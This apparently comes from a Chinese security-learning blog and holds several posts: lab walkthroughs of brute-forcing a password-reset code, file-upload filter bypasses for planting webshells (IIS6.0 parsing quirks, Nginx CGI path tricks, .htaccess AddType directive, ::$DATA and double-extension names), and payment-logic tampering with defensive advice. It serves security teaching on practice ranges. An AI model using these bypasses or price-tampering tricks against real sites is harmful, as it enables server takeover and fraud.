<h2 id="靶场实例"><a href="#靶场实例" class="headerlink" title="靶场实例"></a>靶场实例</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbn3k3ewj31h80q37gc.jpg" alt><br>我们看到这是一个后台管理页面，在这里我们可以看到有一个密码找回，他是通过管理员邮箱来找回的，我们可以通过社工和社区寻找管理员的邮箱。</p>
<p>在这里我们已经找到邮箱了<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbne7ztuj30ir09ddfu.jpg" alt></p>
<p>我们通过审计代码发现认证码是在10-10000的随机数，那如果它没有输入认证码次数限制，那我们可不可以通过爆破来爆出认证码。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3si8n7bwqj30t30i1jxq.jpg" alt><br>我们通过burp抓包<br>进行爆破<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbo8p3hxj31gz0q9ah4.jpg" alt></p>
<p>成功爆破出认证码<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbp05856j30kz09jabl.jpg" alt></p>
<p>我们进行登录<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg" alt="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg"><br>发现登录成功</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-文件上传解析漏洞3" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/文件上传解析漏洞3/" class="article-date">
      <time datetime="2019-12-06T17:03:10.511Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/文件上传解析漏洞3/">文件上传解析漏洞——解析、验证、伪造（三）</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><strong>接上一篇内容</strong></p>
<h2 id="IIS6-0解析漏洞（一）"><a href="#IIS6-0解析漏洞（一）" class="headerlink" title="IIS6.0解析漏洞（一）"></a>IIS6.0解析漏洞（一）</h2><p>我们现在要讲的第一个是IIS6.0的解析问题：</p>
<p>iis6.0除了将ASP后缀当成ASP进行解析的同时，当<strong>文件后缀名字为.asa .cer .cdx也会当做asp去解析</strong>，而严格意思上讲这可以说是iis6的一些特性，只是iis6默认的一些默认配置，文件后缀名字为.asa .cer .cdx之所以也会当做asp去解析，是因为<strong>IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx都会调用asp.dll。</strong></p>
<p>当然，如果我们在iis6.0应用程序扩展配置中添加.allblue调用asp.dll可执行文件路径，那么我们也可以通过.allblue后缀来当成asp文件来解析；</p>
<p>接下来我们来看靶场：<br><img src="https://s2.ax1x.com/2019/05/23/VPPBQO.png" alt><br>这道题，我们只要通过上传一张图片马，并抓包将后缀改成.asa .cer .cdx其中一种后缀，都会被当成asp文件执行(请注意，我们要解析的是asp文件,所以一句话也要是asp的；也不能再本地直接改后缀名，因为这里会验证文件的文件类型)</p>
<p>我们将图片马上传并抓包改包<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bco51gejj30z40rkjup.jpg" alt></p>
<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcotohhjj30z40rkwhz.jpg" alt><br>上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcp8pj9rj30kn06zmx7.jpg" alt><br>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpms01qj31hc05374x.jpg" alt><br>通过菜刀文件连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpzllsuj30zk0jgq4o.jpg" alt></p>
<h2 id="IIS6-0解析漏洞（二）"><a href="#IIS6-0解析漏洞（二）" class="headerlink" title="IIS6.0解析漏洞（二）"></a>IIS6.0解析漏洞（二）</h2><p>首先说明下,IIS5和IIS7.5无此漏洞！</p>
<p>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞，这一解析漏洞有两种完全不同的利用方式：</p>
<p>test.asp;.jpg 会被当做asp进行解析<br>text.asp/123.jpg 会被当做asp进行解析</p>
<p>假如我们请求/aaa.asp;xxxx.jpg<br> 执行过程：</p>
<ol>
<li><p>从头部查找查找“.”,获得.asp;xxxx.jpg</p>
</li>
<li><p>查找“;”号，如果有则内存截断</p>
</li>
<li><p>查找“/”号，如果有则内存截断</p>
</li>
</ol>
<p><strong>最终，将保留下来.asp字符串，从META_SCRIPT_MAP脚本映射表里于扩展名匹配对比，并反馈给asp.dll</strong><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdy4uguij31320m9tbi.jpg" alt><br>我们先上传图片马<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdyhs8kfj30z40rkgoy.jpg" alt><br>并改包<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdysx2crj30z40rkq6a.jpg" alt><br>上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdz1tirij30d903nmx2.jpg" alt><br>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzav54yj31h80600td.jpg" alt><br>通过菜刀文件连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzl1189j30zk0jgwgd.jpg" alt></p>
<h2 id="IIS6-0解析漏洞（三）"><a href="#IIS6-0解析漏洞（三）" class="headerlink" title="IIS6.0解析漏洞（三）"></a>IIS6.0解析漏洞（三）</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj36uy6oj312t0nigog.jpg" alt><br>IIS6.0还有一个漏洞，在后缀是.asp的文件夹下，里面的文件里只要有asp代码，只要进行访问，都会当做asp文件执行；<br>我们先上传图片看看目录：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj3yblsnj31hb09ewet.jpg" alt><br>我发现他的文件是存放在.asp后缀文件夹下，那我们是不是可以上传一张图片马上去直接来当成asp文件执行呢？我们试下</p>
<p>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjbs3411j31f106nt8q.jpg" alt><br>访问成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bje86116j31h204mt9b.jpg" alt></p>
<p>直接用菜刀连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjepq8mqj30zk0jg75h.jpg" alt></p>
<h2 id="CGI解析漏洞"><a href="#CGI解析漏洞" class="headerlink" title="CGI解析漏洞"></a>CGI解析漏洞</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjhl75i1j312z0ms0vg.jpg" alt><br>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设SCRIPT_FILENAME.</p>
<p>当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置&quot;phpinfo.jpg/1.php&quot;,然后构造SCRIPT_FILENAME(绝对路径)传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置&quot;phpinfo.jpg/1.php&quot;,然后构造SCRIPT_FILENAME(绝对路径)传递给PHP</a> CGI，如果开启了fix_pathinfo选项，name就会触发在PHP中的如下逻辑：</p>
<p>PHP会认为SCRIPT_FILENAME(绝对路径)是phpinfo.jpg,而1.php是PATH_INFO,所以就会phpinfo.jpg作为php文件来解析了</p>
<p>这也是一个逻辑问题，所以说<strong>我们只需要在正常的jpg后面加/.php就可以成功的绕过解析</strong></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-文件上传解析漏洞-解析、验证、伪造" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/文件上传解析漏洞-解析、验证、伪造/" class="article-date">
      <time datetime="2019-12-06T17:03:10.507Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/文件上传解析漏洞-解析、验证、伪造/">文件上传解析漏洞-解析、验证、伪造</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="文件上传漏洞："><a href="#文件上传漏洞：" class="headerlink" title="文件上传漏洞："></a>文件上传漏洞：</h1><p>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p>
<p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</p>
<p>这里需要特别说明的是上传漏洞的利用经常会使用WebShell，而WebShell的植入远不止文件上传这一种方式。</p>
<h1 id="webshell："><a href="#webshell：" class="headerlink" title="webshell："></a>webshell：</h1><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p>
<h1 id="文件上传漏洞的原因："><a href="#文件上传漏洞的原因：" class="headerlink" title="文件上传漏洞的原因："></a>文件上传漏洞的原因：</h1><ul>
<li>文件上传时检查不严。没有进行文件格式检查。</li>
<li>文件上传后修改文件名时处理不当。一些应用在服务器端进行了完整的黑名单和白名单过滤，在修改已上传文件文件名时却百密一疏，允许用户修改文件后缀。如应用只能上传.doc文件时攻击者可以先将.php文件后缀修改为.doc，成功上传后在修改文件名时将后缀改回.php。</li>
</ul>
<h1 id="文件上传常见检测："><a href="#文件上传常见检测：" class="headerlink" title="文件上传常见检测："></a>文件上传常见检测：</h1><h3 id="1-客户端检测"><a href="#1-客户端检测" class="headerlink" title="1.客户端检测"></a>1.客户端检测</h3><p>一般都是在网页上写一段js脚本，通过js去检测上传文件的后缀名，有白名单形式也有黑名单形式。</p>
<p><strong>判断方式</strong>：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。前端验证非常不可靠，通过修改数据包后缀名就可以绕过，甚至关闭js都可以尝试绕过。</p>
<h3 id="2-服务端检测"><a href="#2-服务端检测" class="headerlink" title="2.服务端检测"></a>2.服务端检测</h3><p>检查content-type(内容类型)</p>
<p>检查后缀(多为检查后缀)</p>
<p>检查文件头</p>
<h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><p><strong>我们通过upload-labs这个靶场实践来进一步认识文件上传漏洞：</strong></p>
<h2 id="1-前端验证绕过"><a href="#1-前端验证绕过" class="headerlink" title="1.前端验证绕过"></a>1.前端验证绕过</h2><p>发现有一个上传点:<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/3Mmx5VPtCeDOVajrGQdlsIyRqbXkdDVByTBpXwvgJdA!/b/dE8BAAAAAAAA&amp;bo=JAWAAn4HpQMDCVA!&amp;rf=viewer_4" alt></p>
<p>我们试着上传一个带一句话的php上去，并开启burp抓包：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/l.JY9E.mj4AfwMwYb5Dctfcfw9EOUQbMT0Z.zi4J4go!/b/dL8AAAAAAAAA&amp;bo=ZQaAAnwGiQIDGSw!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/uTXBzs2Ps5cWXXSqyuT6tJycypL.Z6kJ*kCngBftG6s!/b/dDUBAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt><br>发现被拦截下来，提示只能上传图片类型，而在burp上并无抓取到任何数据，这证明就是一个典型的客户端前端检测</p>
<p>我们通过将php文件改成jpg文件使其符合检测要求，再在抓取数据包时将文件后缀改回php，从而完成绕过：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/TTZRCftxc3JNuulzU7WceTsyeEqqCQOokzNoepwq*XA!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt></p>
<p>发现成功上传<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*EDL2ABep5jCTnuEtx3hbs3zd7SZRFPJR3GKoldj5xc!/b/dLYAAAAAAAAA&amp;bo=gAcyAoAHMgIDGTw!&amp;rf=viewer_4" alt></p>
<p>通过连接菜刀或直接调用一句话函数都可以实现了getshell；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/4TFYbPyRNP5*fBz2AFQw*IZxJcvcViw.uVEx9OrYYt8!/b/dIMAAAAAAAAA&amp;bo=XQfVA10H1QMDGTw!&amp;rf=viewer_4" alt></p>
<h2 id="2-Content-Type方式绕过"><a href="#2-Content-Type方式绕过" class="headerlink" title="2.Content-Type方式绕过"></a>2.Content-Type方式绕过</h2><p>分析源码，知道了是对Content-Type(内容类型)和文件头的检测，<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/k7Q*x9fqgWz5dGtJqOsWKzPvTT0idkTpvc1k9nKHPLs!/b/dLgAAAAAAAAA&amp;bo=BgWAAmUHrgMRGWA!&amp;rf=viewer_4" alt></p>
<p>那我们想到的是就是图片马，图片马是可以很好的绕过内容类型和文件头检测的，在这里我准备好了一个写了一句话的txt文件和一张小图片来合成一张图片马：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/gz4TwdZE01nQdK7U6tdbyqa9xidrPgWSev6j8jC5.jM!/b/dFMBAAAAAAAA&amp;bo=zADaAMwA2gARGS4!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/OJ0mpZH4z1GBmvVyPYgtUiengE6r*78DPKn.ynq4WTc!/b/dMUAAAAAAAAA&amp;bo=nQI*AZ0CPwERGS4!&amp;rf=viewer_4" alt><br>成功生成图片马，然后我们将图片马上传并抓包将后缀改为php，因为web容器是根据后缀去解析不同的文件的，所以我们将他改成php<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/dUa5qe571hvX4y8kSTfD*rEs.jxaziSx8mmE0Yo.9sI!/b/dIQAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt><br>最后成功上传，并调用一句话<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/8Temr59hWbfKnh6OUyr0dRh3UCato6TZFcWnUChSbHM!/b/dL8AAAAAAAAA&amp;bo=MQWAAmgHkQMRGWU!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZO3Z5LqU7MPUKOuIRhqiYTwnCmkpNEaHxm1U*T3d1.o!/b/dDQBAAAAAAAA&amp;bo=dAfXA3QH1wMRCT4!&amp;rf=viewer_4" alt></p>
<h2 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h2><p>查看源码<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/Nb6czO9WTB4*L6e6mQuqQ7Agi.ex2aNHMb*tv6W2SgM!/b/dLYAAAAAAAAA&amp;bo=ZQW9AmUFvQIRCT4!&amp;rf=viewer_4" alt><br>发现是一个黑名单绕过，它拦截了.asp,.aspx,.php,.jsp后缀的文件，但他拦截了php，是不是就意味着我们就不能上传php文件了呢？其实不是的，在默认状态下<strong>php，php3，php4，php5，phtml</strong>是会被解析成php的，请看下图<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ekwZbyk2edL5EupB09P8Jmdsc2QvPzfargMfRfWj03U!/b/dMAAAAAAAAAA&amp;bo=LgGkAC4BpAARCT4!&amp;rf=viewer_4" alt><br>我们将图片马后缀改成php3，成功将上传，调用一句话，最后成功调用，证明是可以php3是可以被php解析的；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/ER3vfEB2o6Cz20fHXHQSnQVYaezJOBDlDhVPMMSlH4o!/b/dL8AAAAAAAAA&amp;bo=ewfSA3sH0gMRGS4!&amp;rf=viewer_4" alt></p>
<h2 id="4-htaccess文件绕过"><a href="#4-htaccess文件绕过" class="headerlink" title="4. .htaccess文件绕过"></a>4. .htaccess文件绕过</h2><p><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/mEWjMDZU2Q7YDuklJEEfcKIcukqlBjU8U*FNNsBltTw!/b/dDIBAAAAAAAA&amp;bo=VAXJAlQFyQIRGS4!&amp;rf=viewer_4" alt><br>.htaccess是什么？.htaccess文件也被称为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或者多个指令的文件，以作用于此目录及其所有子目录。<br>.htaccess功能：<br>文件密码保护，用户自定义重定向，自定义404页面，扩展名伪静态化，禁止特定ip地址的用户，但这个功能默认是不开启的。</p>
<p>.htaccess中有一条指令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
<p>这个指令代表着.jpg文件会当做php来解析。</p>
<p>只要我们把带有这条指令的.htaccess配置文件上传上去到有黑名单拦截的上传点，那就意味着我们就能将图片马直接上传上去了！</p>
<p>图形化界面是不允许我们将文件命名为空文件名 .htaccess，所以这里通过cmd命令来进行重命名：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*Z8xWXTZLwkgcga9IhymWx*oWoG6MnmR9M.DajlIFl8!/b/dE0BAAAAAAAA&amp;bo=WwTQAlsE0AIRGS4!&amp;rf=viewer_4" alt><br>成功命名，<br>我们接下来，只需要先将.htaccess配置文件先传上去，在将图片马传上去即可；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/QjmHLIRy7nOP*i6x2BoPnYS58mG3WipMkEMJnsztUyk!/b/dLYAAAAAAAAA&amp;bo=gAfcA4AH3AMRGS4!&amp;rf=viewer_4" alt></p>
<h2 id="5-后缀大小写绕过"><a href="#5-后缀大小写绕过" class="headerlink" title="5.后缀大小写绕过"></a>5.后缀大小写绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/NsiHDYDfN.Hj.9yD1bRwXVg.UMyHnH6x.WU0p0PPKtY!/b/dFMBAAAAAAAA&amp;bo=YAXIAmAFyAIRCT4!&amp;rf=viewer_4" alt></p>
<p>在这里，虽然使用了很多过滤，过滤了很多文件类型，但却没将文件后缀统一转化为小写，所以我们是能通过后缀大小写来绕过上传的：</p>
<p><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/yOlNuyZEw.zicCi8Edmbs5BKc1fH.HnwoPjmqQwes4Q!/b/dFMBAAAAAAAA&amp;bo=ZwCCAGcAggARGS4!&amp;rf=viewer_4" alt></p>
<p>我们将做成图片马直接将后缀改成Php，进行上传<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRGS4!&amp;rf=viewer_4" alt></p>
<h2 id="6-文件后缀（空）绕过"><a href="#6-文件后缀（空）绕过" class="headerlink" title="6.文件后缀（空）绕过"></a>6.文件后缀（空）绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ctpzNLW1hvfPIv.T4z0Dkrsak5SyY67FtTJu8nlEkzQ!/b/dDQBAAAAAAAA&amp;bo=ZwXFAmcFxQIRCT4!&amp;rf=viewer_4" alt></p>
<p>这里相对于前面关卡的代码是少了一个消除两旁空格的函数trim();所以我们我们可以通过在后缀加个空格尝试绕过，<strong>黑名单机制中，是不允许上传什么，但如果我们传上去的文件与所限制的稍有不一样，那是不是就可以直接绕过黑名单了</strong></p>
<p>我们进行将带有一句话的php文件上传并抓包</p>
<p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/d*pCj2unPGzQ7rMhKzo8QEfPa7tBLtExl229Qs*79HE!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p>
<p>在后缀加个空格，上传</p>
<p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRCT4!&amp;rf=viewer_4" alt></p>
<h2 id="7-文件后缀-点-绕过"><a href="#7-文件后缀-点-绕过" class="headerlink" title="7.文件后缀(点)绕过"></a>7.文件后缀(点)绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/m1IqTO83xMSNLK8m2qvEU8CwZUTsqPY3GoAIPB1aFdY!/b/dL8AAAAAAAAA&amp;bo=CQWAAmAFqwIRCXw!&amp;rf=viewer_4" alt><br>这里是少了一个删除末尾的点的函数</p>
<p>我们还是进行将带有一句话的php文件上传并抓包</p>
<p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/qiENQR89aUzEeuVUhohrosTDte9YlnwFnZr1bGrfjko!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br>在后缀加个点，上传，在上传到服务器后，服务器会自动将点去掉，只读取前面有用的后缀；<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/synsgTwLVgNk6k9.rkhjouhz5iuujzkRNdYZALQkaCg!/b/dDcBAAAAAAAA&amp;bo=gAfbA4AH2wMRCT4!&amp;rf=viewer_4" alt></p>
<h2 id="8-DATA（Windows文件流绕过）"><a href="#8-DATA（Windows文件流绕过）" class="headerlink" title="8.::$DATA（Windows文件流绕过）"></a>8.::$DATA（Windows文件流绕过）</h2><p>::$DATA（Windows文件流绕过）（这里利用到了NTFS交换数据流(ADS)，ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都存在许多个数据流。通俗理解，就是其他文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿问文件。）</p>
<p>例如在cmd命令下运行：echo abcd&gt;&gt;a.txt:b.txt 很明显生成一个a.txt，但是会是空值，因为系统将值写到寄宿文件上去了；</p>
<p>然后再运行 echo 123&gt;&gt;a.txt::$DATA，是会在a.txt中输出123的，因为<br>::$DATA相当是个空值，不是一个寄宿文件，所以还是会将文件写入到a.txt中去，不修改文件存储过程；</p>
<p>在利用Windows特性，可在后缀加上“ ::$DATA ”绕过。<br>跟之前一样的思路，抓包改包绕过。<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZxgolmKjvTPXMgVANvNagukSCz3aQqzZw.zzqXbcpS4!/b/dEgBAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p>
<p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/.jYmXUYDdeLg0syadDStJOYrClaPTtwNCJ92IdU5zYs!/b/dLYAAAAAAAAA&amp;bo=fgfSA34H0gMRCT4!&amp;rf=viewer_4" alt></p>
<h2 id="9-构造文件后缀绕过"><a href="#9-构造文件后缀绕过" class="headerlink" title="9.构造文件后缀绕过"></a>9.构造文件后缀绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/u0nPUSpkCll3GfBBIDmRopaaxgVdUrxPl0kX1o15lXo!/b/dMAAAAAAAAAA&amp;bo=awXNAmsFzQIRCT4!&amp;rf=viewer_4" alt><br>第九关好像用了我们前面关卡的所有过滤，那我们可不可以构造一个文件名后缀111.php. . 过滤参数在发现.时会将.去掉，在将空格去掉，最后只剩下111.php. 这样还是可以绕过黑名单机制的，因为111.php.不等于111.php，所以还是能绕过上传；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/b3gpzQ8zgA4BwI3BdF4*1rxQ4lONy3af9pXegTyO3Gg!/b/dLgAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt></p>
<h2 id="10双写文件后缀绕过"><a href="#10双写文件后缀绕过" class="headerlink" title="10双写文件后缀绕过"></a>10双写文件后缀绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ypZhRcfDvAhSB.SfJLlAWG2DK8tmHOECM2ZWrfGyWtU!/b/dIQAAAAAAAAA&amp;bo=agUEAmoFBAIRCT4!&amp;rf=viewer_4" alt></p>
<p>会将符合条件的文件后缀删除，我们只需要将文件后缀进行双写，令他删除后合并就能成功绕过！</p>
<p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/4OigHcJUMtz6dSWTiGju0oMns0AxY1eM0u*O.o.QG7E!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/LG5JK1ZorQZBrglBO1UAbGKez.B5lgA3DPErpWLP77M!/b/dDcBAAAAAAAA&amp;bo=cgfWA3IH1gMRCT4!&amp;rf=viewer_4" alt></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-支付漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/支付漏洞/" class="article-date">
      <time datetime="2019-12-06T17:03:10.503Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/支付漏洞/">支付漏洞</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="快捷支付原理"><a href="#快捷支付原理" class="headerlink" title="快捷支付原理"></a>快捷支付原理</h2><p>商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知</p>
<h3 id="浏览器跳转"><a href="#浏览器跳转" class="headerlink" title="浏览器跳转"></a>浏览器跳转</h3><p>基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性</p>
<h3 id="服务端异步通知"><a href="#服务端异步通知" class="headerlink" title="服务端异步通知"></a>服务端异步通知</h3><p>该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用post或get的方式。商户网站接受异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额，订单信息是否与发起支付时一致，验证正常则对定单进行状态处理或为用户进行网站内入账等。</p>
<p>该漏洞属于逻辑漏洞的一种，需要靠不一样的思维，来进行逻辑绕过。</p>
<p>##常见支付漏洞<br>支付步骤：————订购、订单、付款</p>
<p>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可以在最后一步富矿石进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p>
<ul>
<li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0112258.html" target="_blank" rel="noopener">修改支付金额案例</a></p>
</li>
<li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0102292.html" target="_blank" rel="noopener">修改支付状态案例</a></p>
</li>
<li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0108134.html" target="_blank" rel="noopener">修改订单数量案例</a></p>
</li>
<li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0139556.html" target="_blank" rel="noopener">修改附属值案例</a></p>
</li>
</ul>
<p>优惠券其基本都是优惠一半，一般用优惠券进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p>
<p>越权支付<br>存在user=id(123)，这种传参时，尝试改id，尝试用别人的钱包买自己的物品</p>
<p><a href="http://www.anquan.us/static/bugs/wooyun-2016-0188155.html" target="_blank" rel="noopener">无限制试用案例</a><br>比如试用的参数为2，正常购买的参数为1<br>那么我们购买参数为2(试用)，会发生什么呢？</p>
<h2 id="支付漏洞-挖掘"><a href="#支付漏洞-挖掘" class="headerlink" title="支付漏洞(挖掘)"></a>支付漏洞(挖掘)</h2><ul>
<li><strong>找到关键的数据包</strong><br>可能支付操作有三四个数据包，我们要对数据进行挑选。</li>
<li><strong>分析数据包</strong><br>支付数据包中会包含很多的敏感信息(账号，金额，余额，优惠)，要擦尝试对数据包中的各个参数进行分析</li>
<li><strong>不按套路出牌</strong><br>多去想想开发想不到的地方<br>pc端尝试过，wap端也看看，app也试试</li>
</ul>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1、后端检查每一项值，包括支付状态。</p>
<p>2、校验价格、数量参数，比如产品数量只能为整数，并限制购买数量</p>
<p>3、与第三方支付平台检查，实际支付的金额是否与订单一致。</p>
